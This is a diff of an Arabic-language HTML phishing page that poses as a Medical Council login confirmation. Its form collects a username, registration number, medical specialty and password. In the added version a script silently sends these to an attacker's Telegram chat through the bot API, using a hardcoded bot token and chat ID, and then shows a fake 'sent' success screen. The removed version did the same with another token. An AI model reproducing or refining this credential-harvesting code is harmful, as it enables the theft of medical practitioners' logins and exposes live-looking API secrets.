@@ -3,60 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>التحقق السريع</title>
+    <title>المجلس الطبي</title>
     <style>
-        body { margin: 0; background: #111827; font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
-        .card { width: 90%; max-width: 380px; background: #1f2937; border-radius: 20px; padding: 25px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #374151; }
-        .input-item { background: #374151; border: none; border-radius: 12px; width: 100%; padding: 15px; margin-bottom: 12px; color: white; font-size: 16px; box-sizing: border-box; text-align: right; }
-        .btn-fast { width: 100%; padding: 18px; background: #0088cc; color: white; border: none; border-radius: 15px; font-size: 18px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .btn-fast:active { transform: scale(0.98); background: #0077b5; }
+        body { margin: 0; background: #0f172a; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
+        .card { width: 90%; max-width: 380px; background: #1e293b; border-radius: 20px; padding: 25px; text-align: center; border: 1px solid #334155; }
+        input, select { width: 100%; height: 50px; background: #334155; border: none; border-radius: 10px; padding: 0 15px; margin-bottom: 10px; color: white; font-size: 16px; box-sizing: border-box; text-align: right; }
+        .btn { width: 100%; height: 55px; background: #0088cc; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        #success { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div style="font-size: 40px; margin-bottom: 15px; text-align: center;">⚡</div>
-    <h2 style="text-align: center; margin-top: 0;">تسجيل دخول سريع</h2>
-    
-    <input type="text" id="u" class="input-item" placeholder="اسم المستخدم">
-    <input type="tel" id="r" class="input-item" placeholder="رقم القيد">
-    <select id="s" class="input-item">
-        <option>طب عام</option>
-        <option>طب أسنان</option>
-        <option>صيدلة</option>
-    </select>
-    <input type="password" id="p" class="input-item" placeholder="كلمة المرور">
-
-    <button onclick="fastSend()" class="btn-fast">
-        <span>تأكيد عبر تليجرام</span>
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 22l10-4 10 4L12 2z"></path></svg>
-    </button>
+<div class="card" id="box">
+    <div id="form">
+        <h2 style="margin-bottom: 20px;">تأكيد الدخول</h2>
+        <input type="text" id="u" placeholder="اسم المستخدم">
+        <input type="tel" id="r" placeholder="رقم التسجيل">
+        <select id="s"><option>طب عام</option><option>طب أسنان</option><option>صيدلة</option></select>
+        <input type="password" id="p" placeholder="كلمة المرور">
+        <button onclick="send()" class="btn" id="b">إرسال وتأكيد</button>
+    </div>
+    <div id="success">
+        <h2 style="color: #4ade80;">✅ تم الإرسال</h2>
+        <p>تصلك الرسالة الآن في البوت.</p>
+    </div>
 </div>
 
 <script>
-    function fastSend() {
-        const user = document.getElementById('u').value;
-        const reg = document.getElementById('r').value;
-        const spec = document.getElementById('s').value;
-        const pass = document.getElementById('p').value;
+    function send() {
+        const token = "8682180549:AAGxYYy6V5adsST-1M7SrSQqk6EV4gRlM5I"; // التوكن الجديد
+        const chatId = "7746757675"; // معرفك الشخصي
+        const msg = `📥 بيانات جديدة:\n👤 اليوزر: ${document.getElementById('u').value}\n🆔 الرقم: ${document.getElementById('r').value}\n🩺 التخصص: ${document.getElementById('s').value}\n🔑 الكلمة: ${document.getElementById('p').value}`;
 
-        // تجهيز نص الرسالة
-        const text = `📥 بيانات جديدة:\n👤 اليوزر: ${user}\n🆔 الرقم: ${reg}\n🩺 التخصص: ${spec}\n🔑 الكلمة: ${pass}`;
-        
-        // رابط الديب لينك المباشر للبوت الخاص بك
-        const botUsername = "tlastlasbot"; // يوزربوت الخاص بك
-        const url = `https://t.me/${botUsername}?start=${btoa(text).substring(0, 60)}`;
-        
-        // بدلاً من الإرسال البرمجي المعقد، نفتح البوت مباشرة بالبيانات
-        window.location.href = `tg://msg?text=${encodeURIComponent(text)}&to=7746757675`;
-        
-        // إذا لم يفتح التطبيق، نستخدم الرابط البديل
-        setTimeout(() => {
-            window.open(`https://api.telegram.org/bot8629398802:AAFpohJ2Y8Nmz5Je9FF262TW8YWIxUzruXg/sendMessage?chat_id=7746757675&text=${encodeURIComponent(text)}`);
-            alert("تم إرسال طلب التأكيد بنجاح!");
-        }, 500);
+        // الرابط المباشر للإرسال فوراً
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+        // تنفيذ الإرسال
+        fetch(url, { mode: 'no-cors' });
+
+        // إظهار رسالة النجاح
+        document.getElementById('form').style.display = 'none';
+        document.getElementById('success').style.display = 'block';
     }
 </script>
-
 </body>
 </html>
